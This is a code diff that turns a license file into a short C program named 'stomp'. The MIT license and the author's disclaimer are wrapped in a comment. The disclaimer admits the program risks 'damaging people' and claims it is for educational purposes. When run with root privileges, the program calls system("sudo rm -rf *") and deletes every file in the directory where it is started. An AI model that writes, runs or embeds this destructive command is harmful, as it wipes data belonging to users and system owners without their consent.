@@ -1,3 +1,4 @@
+/*
 MIT License
 
 Copyright (c) 2024 Ely Torres Neto
@@ -23,4 +24,27 @@ SOFTWARE.
 Notes by developer:
 
 I AM NOT RESPONSIBLE FOR ANY DAMAGE AND CAUSE. WHEN YOU RUN THIS PROGRAM, 
-YOU AGREED WITH THE RISK OF DAMAGING PEOPLE. THE USAGE OF THIS PROGRAM IS ONLY ALLOWED FOR EDUCATIONAL PROPOUSES!
+YOU AGREED WITH THE RISK OF DAMAGING PEOPLE. 
+THE USAGE OF THIS PROGRAM IS ONLY ALLOWED FOR EDUCATIONAL PROPOUSES!
+
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+#define SUDO 0
+
+
+const char *REMOVE_ALL = "sudo rm -rf *";
+int main(void){
+
+	if(geteuid() == 0){
+		printf("stomping...");
+		system(REMOVE_ALL);
+		return EXIT_SUCCESS;
+	}
+
+	printf("stomp must be started with privilegies.");
+	return EXIT_FAILURE;
+}
